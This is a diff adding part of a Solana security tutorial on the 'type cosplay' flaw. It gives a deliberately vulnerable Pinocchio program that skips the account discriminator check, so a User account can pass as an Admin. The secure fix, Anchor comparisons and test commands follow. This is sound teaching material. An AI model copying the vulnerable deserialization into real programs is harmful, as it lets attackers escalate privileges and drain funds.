+};
+use solana_program_error::ProgramError;
+
+pub mod state;
+use state::{Admin, User};
+
+const ID: Address = Address::new_from_array([
+    0xf0, 0xe1, 0xd2, 0xc3, 0xb4, 0xa5, 0x96, 0x87,
+    0x78, 0x69, 0x5a, 0x4b, 0x3c, 0x2d, 0x1e, 0x0f,
+    0x0f, 0x1e, 0x2d, 0x3c, 0x4b, 0x5a, 0x69, 0x78,
+    0x87, 0x96, 0xa5, 0xb4, 0xc3, 0xd2, 0xe1, 0x01,
+]);
+
+entrypoint!(process_instruction);
+
+pub fn process_instruction(
+    program_id: &Address,
+    accounts: &[AccountView],
+    instruction_data: &[u8],
+) -> ProgramResult {
+    if program_id != &ID {
+        return Err(ProgramError::IncorrectProgramId);
+    }
+
+    match instruction_data.first() {
+        Some(&0) => initialize_admin(accounts),
+        Some(&1) => initialize_user(accounts),
+        Some(&2) => admin_operation(accounts),
+        _ => Err(ProgramError::InvalidInstructionData),
+    }
+}
+
+fn initialize_admin(accounts: &[AccountView]) -> ProgramResult {
+    let [authority_info, admin_account_info, _system_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !authority_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    if !admin_account_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    let mut data = admin_account_info.try_borrow_mut()?;
+
+    if data.len() < Admin::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    let authority_bytes: [u8; 32] = authority_info.address().as_ref().try_into().unwrap();
+    Admin::serialize(&authority_bytes, 0, &mut data);
+
+    Ok(())
+}
+
+fn initialize_user(accounts: &[AccountView]) -> ProgramResult {
+    let [authority_info, user_account_info, _system_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !authority_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    if !user_account_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    let mut data = user_account_info.try_borrow_mut()?;
+
+    if data.len() < User::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    let authority_bytes: [u8; 32] = authority_info.address().as_ref().try_into().unwrap();
+    User::serialize(&authority_bytes, 0, &mut data);
+
+    Ok(())
+}
+
+/// Deserializes account data without checking the discriminator byte
+fn admin_operation(accounts: &[AccountView]) -> ProgramResult {
+    let [authority_info, admin_account_info] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !authority_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    if !admin_account_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    let data = admin_account_info.try_borrow()?;
+
+    if data.len() < Admin::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    // No discriminator check -- a User account passes through here unchanged
+    let admin = Admin::deserialize(&data)
+        .map_err(|_| ProgramError::InvalidAccountData)?;
+
+    let authority_bytes: [u8; 32] = authority_info.address().as_ref().try_into().unwrap();
+    if admin.authority != authority_bytes {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    drop(data);
+    let mut data = admin_account_info.try_borrow_mut()?;
+
+    let admin = Admin::deserialize(&data)
+        .map_err(|_| ProgramError::InvalidAccountData)?;
+
+    let new_count = admin.operation_count + 1;
+    data[34..42].copy_from_slice(&new_count.to_le_bytes());
+
+    Ok(())
+}
 ```
 </CodeGroup>
 
-## Security Checklist
+Look at `Admin::deserialize`: it reads `data[1..33]` for the authority, `data[33]` for privilege level, and `data[34..42]` for the count -- but it never checks `data[0]`. A User account with `data[0] == 2` passes through identically.
 
-- [ ] All typed accounts use `Account<'info, T>` (Anchor)
-- [ ] Or manual discriminator checks before deserialization (Pinocchio)
-- [ ] No `UncheckedAccount` used when deserializing data
-- [ ] Tests verify wrong account types are rejected
-- [ ] Account types with similar layouts have distinct discriminators
+## Step 8 -- Fix the Pinocchio program
 
-## Resources & Next Steps
+The secure version adds a discriminator check in two places: once explicitly in `admin_operation` before deserialization, and once inside `Admin::deserialize` itself as defense in depth.
 
-<CardGroup cols={3}>
-  <Card title="View Source Code" icon="code" href="https://github.com/superteamng/solana-security-reference/tree/main/programs/type-cosplay">
-    Browse vulnerable and secure implementations
-  </Card>
-  <Card title="Run Tests" icon="flask" href="https://github.com/superteamng/solana-security-reference/tree/main/tests">
-    See type cosplay attacks demonstrated
-  </Card>
-  <Card title="Next: PDA Sharing" icon="arrow-right" href="/vulnerabilities/pda-sharing">
-    Learn about PDA seed insufficiency attacks
-  </Card>
-</CardGroup>
+<CodeGroup>
+```rust title="programs/type-cosplay/secure/pinocchio/src/state.rs"
+pub mod discriminators {
+    pub const ADMIN: u8 = 1;
+    pub const USER: u8 = 2;
+}
 
-<Tip>
-**Quick Check:** If you're using `UncheckedAccount` and deserializing its data, you likely have this vulnerability!
-</Tip>
+/// Layout: [discriminator(1), authority(32), privilege_level(1), operation_count(8)] = 42 bytes
+pub struct Admin;
+
+impl Admin {
+    pub const LEN: usize = 1 + 32 + 1 + 8;
+    pub const DISCRIMINATOR: u8 = discriminators::ADMIN;
+    pub const PRIVILEGE_LEVEL: u8 = 10;
+
+    pub fn serialize(authority: &[u8; 32], operation_count: u64, dest: &mut [u8]) {
+        dest[0] = Self::DISCRIMINATOR;
+        dest[1..33].copy_from_slice(authority);
+        dest[33] = Self::PRIVILEGE_LEVEL;
+        dest[34..42].copy_from_slice(&operation_count.to_le_bytes());
+    }
+
+    /// Validates discriminator before deserializing
+    pub fn deserialize(data: &[u8]) -> Result<AdminData, &'static str> {
+        if data.len() < Self::LEN {
+            return Err("Account data too small");
+        }
+
+        if data[0] != Self::DISCRIMINATOR {
+            return Err("Invalid discriminator: expected Admin account");
+        }
+
+        let mut authority = [0u8; 32];
+        authority.copy_from_slice(&data[1..33]);
+
+        let privilege_level = data[33];
+
+        let mut count_bytes = [0u8; 8];
+        count_bytes.copy_from_slice(&data[34..42]);
+        let operation_count = u64::from_le_bytes(count_bytes);
+
+        Ok(AdminData {
+            authority,
+            privilege_level,
+            operation_count,
+        })
+    }
+}
+
+/// Same layout as Admin
+pub struct User;
+
+impl User {
+    pub const LEN: usize = 1 + 32 + 1 + 8;
+    pub const DISCRIMINATOR: u8 = discriminators::USER;
+    pub const PRIVILEGE_LEVEL: u8 = 1;
+
+    pub fn serialize(authority: &[u8; 32], operation_count: u64, dest: &mut [u8]) {
+        dest[0] = Self::DISCRIMINATOR;
+        dest[1..33].copy_from_slice(authority);
+        dest[33] = Self::PRIVILEGE_LEVEL;
+        dest[34..42].copy_from_slice(&operation_count.to_le_bytes());
+    }
+
+    /// Validates discriminator before deserializing
+    pub fn deserialize(data: &[u8]) -> Result<UserData, &'static str> {
+        if data.len() < Self::LEN {
+            return Err("Account data too small");
+        }
+
+        if data[0] != Self::DISCRIMINATOR {
+            return Err("Invalid discriminator: expected User account");
+        }
+
+        let mut authority = [0u8; 32];
+        authority.copy_from_slice(&data[1..33]);
+
+        let privilege_level = data[33];
+
+        let mut count_bytes = [0u8; 8];
+        count_bytes.copy_from_slice(&data[34..42]);
+        let operation_count = u64::from_le_bytes(count_bytes);
+
+        Ok(UserData {
+            authority,
+            privilege_level,
+            operation_count,
+        })
+    }
+}
+
+pub struct AdminData {
+    pub authority: [u8; 32],
+    pub privilege_level: u8,
+    pub operation_count: u64,
+}
+
+pub struct UserData {
+    pub authority: [u8; 32],
+    pub privilege_level: u8,
+    pub operation_count: u64,
+}
+```
+
+```rust title="programs/type-cosplay/secure/pinocchio/src/lib.rs"
+#![no_std]
+
+#[cfg(not(feature = "no-entrypoint"))]
+#[panic_handler]
+fn panic(_info: &core::panic::PanicInfo) -> ! {
+    loop {}
+}
+
+use pinocchio::{
+    entrypoint,
+    AccountView,
+    Address,
+    ProgramResult,
+};
+use solana_program_error::ProgramError;
+
+pub mod state;
+use state::{Admin, User};
+
+const ID: Address = Address::new_from_array([
+    0x53, 0x65, 0x63, 0x75, 0x54, 0x79, 0x70, 0x65,
+    0x50, 0x69, 0x6e, 0x6f, 0x31, 0x31, 0x31, 0x31,
+    0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31,
+    0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x02,
+]);
+
+entrypoint!(process_instruction);
+
+pub fn process_instruction(
+    program_id: &Address,
+    accounts: &[AccountView],
+    instruction_data: &[u8],
+) -> ProgramResult {
+    if program_id != &ID {
+        return Err(ProgramError::IncorrectProgramId);
+    }
+
+    match instruction_data.first() {
+        Some(&0) => initialize_admin(accounts),
+        Some(&1) => initialize_user(accounts),
+        Some(&2) => admin_operation(accounts),
+        _ => Err(ProgramError::InvalidInstructionData),
+    }
+}
+
+fn initialize_admin(accounts: &[AccountView]) -> ProgramResult {
+    let [authority_info, admin_account_info, _system_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !authority_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    if !admin_account_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    let mut data = admin_account_info.try_borrow_mut()?;
+
+    if data.len() < Admin::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    let authority_bytes: [u8; 32] = authority_info.address().as_ref().try_into().unwrap();
+    Admin::serialize(&authority_bytes, 0, &mut data);
+
+    Ok(())
+}
+
+fn initialize_user(accounts: &[AccountView]) -> ProgramResult {
+    let [authority_info, user_account_info, _system_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !authority_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    if !user_account_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    let mut data = user_account_info.try_borrow_mut()?;
+
+    if data.len() < User::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    let authority_bytes: [u8; 32] = authority_info.address().as_ref().try_into().unwrap();
+    User::serialize(&authority_bytes, 0, &mut data);
+
+    Ok(())
+}
+
+/// Checks data[0] against Admin::DISCRIMINATOR before deserializing
+fn admin_operation(accounts: &[AccountView]) -> ProgramResult {
+    let [authority_info, admin_account_info] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !authority_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    if !admin_account_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    let data = admin_account_info.try_borrow()?;
+
+    if data.len() < Admin::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    // Explicit discriminator check before deserialization
+    if data[0] != Admin::DISCRIMINATOR {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    // Admin::deserialize also checks internally (defense in depth)
+    let admin = Admin::deserialize(&data)
+        .map_err(|_| ProgramError::InvalidAccountData)?;
+
+    let authority_bytes: [u8; 32] = authority_info.address().as_ref().try_into().unwrap();
+    if admin.authority != authority_bytes {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    drop(data);
+    let mut data = admin_account_info.try_borrow_mut()?;
+
+    if data[0] != Admin::DISCRIMINATOR {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    let admin = Admin::deserialize(&data)
+        .map_err(|_| ProgramError::InvalidAccountData)?;
+
+    let new_count = admin.operation_count + 1;
+    data[34..42].copy_from_slice(&new_count.to_le_bytes());
+
+    Ok(())
+}
+```
+</CodeGroup>
+
+The critical difference in `state.rs` is inside `Admin::deserialize`:
+
+<CodeGroup>
+```rust title="Vulnerable -- no check"
+pub fn deserialize(data: &[u8]) -> Result<AdminData, &'static str> {
+    if data.len() < Self::LEN {
+        return Err("Account data too small");
+    }
+
+    // Reads bytes without checking data[0]
+    let mut authority = [0u8; 32];
+    authority.copy_from_slice(&data[1..33]);
+    // ...
+}
+```
+
+```rust title="Secure -- discriminator validated"
+pub fn deserialize(data: &[u8]) -> Result<AdminData, &'static str> {
+    if data.len() < Self::LEN {
+        return Err("Account data too small");
+    }
+
+    if data[0] != Self::DISCRIMINATOR {
+        return Err("Invalid discriminator: expected Admin account");
+    }
+
+    let mut authority = [0u8; 32];
+    authority.copy_from_slice(&data[1..33]);
+    // ...
+}
+```
+</CodeGroup>
+
+If an attacker passes a User account (`data[0] == 2`), the check against `Admin::DISCRIMINATOR` (`1`) fails immediately. The transaction aborts before any privileged logic runs.
+
+## Side-by-side comparison
+
+<Tabs>
+  <Tab title="Anchor">
+    <CodeGroup>
+    ```rust title="Vulnerable"
+    #[derive(Accounts)]
+    pub struct AdminOperation<'info> {
+        pub authority: Signer<'info>,
+
+        #[account(mut)]
+        /// CHECK: No discriminator validation.
+        pub admin_account: UncheckedAccount<'info>,
+    }
+    ```
+
+    ```rust title="Secure"
+    #[derive(Accounts)]
+    pub struct AdminOperation<'info> {
+        pub authority: Signer<'info>,
+
+        #[account(
+            mut,
+            constraint = admin_account.authority == authority.key() @ ErrorCode::Unauthorized
+        )]
+        pub admin_account: Account<'info, Admin>,
+    }
+    ```
+    </CodeGroup>
+
+    In Anchor, the fix is a type-level change. `Account<'info, Admin>` tells Anchor to compare the first 8 bytes of account data against `sha256("account:Admin")[..8]`. A User account carries a different discriminator and is rejected before any instruction logic executes.
+  </Tab>
+
+  <Tab title="Pinocchio">
+    <CodeGroup>
+    ```rust title="Vulnerable"
+    fn admin_operation(accounts: &[AccountView]) -> ProgramResult {
+        // ...
+        let data = admin_account_info.try_borrow()?;
+        let admin = Admin::deserialize(&data)
+            .map_err(|_| ProgramError::InvalidAccountData)?;
+        // ...
+    }
+    ```
+
+    ```rust title="Secure"
+    fn admin_operation(accounts: &[AccountView]) -> ProgramResult {
+        // ...
+        let data = admin_account_info.try_borrow()?;
+
+        if data[0] != Admin::DISCRIMINATOR {
+            return Err(ProgramError::InvalidAccountData);
+        }
+
+        let admin = Admin::deserialize(&data)
+            .map_err(|_| ProgramError::InvalidAccountData)?;
+        // ...
+    }
+    ```
+    </CodeGroup>
+
+    In Pinocchio, there is no framework to do the check for us. We validate `data[0]` manually before calling `deserialize`, and we also bake the check into `deserialize` itself for defense in depth.
+  </Tab>
+</Tabs>
+
+## Key takeaways
+
+- **Identical layouts are invisible without discriminators.** If two account types share the same field order and sizes, raw deserialization cannot tell them apart.
+- **In Anchor, always use `Account<'info, T>` for typed accounts.** It validates the 8-byte discriminator automatically. Reserve `UncheckedAccount` for cases where you genuinely do not deserialize the data.
+- **In Pinocchio, check the discriminator before every deserialization.** Validate `data[0]` explicitly, and embed the check inside your `deserialize` function as a second layer.
+- **This is not theoretical.** The Cashio exploit drained $52 million by substituting a fake collateral account that matched the expected layout.
+- **Test both directions.** Verify that legitimate accounts work _and_ that substituted accounts are rejected.
+
+## Run it yourself
+
+```bash
+git clone https://github.com/danielAsaboro/solana_badger
+cd solana_badger
+npm install
+anchor build
+```
+
+Run the Anchor type cosplay tests:
+
+```bash
+anchor test -- --grep "Type Cosplay"
+```
+
+You will see both the exploit demonstration (vulnerable program accepts the User account) and the fix confirmation (secure program rejects it with a discriminator mismatch error).
+
+Run the Pinocchio type cosplay tests:
+
+```bash
+npx jest tests/pinocchio/type-cosplay.pinocchio.test.ts
+```
+
+You will see the same pattern: the vulnerable Pinocchio program accepts the cosplayed account, and the secure version rejects it at the `data[0]` check.
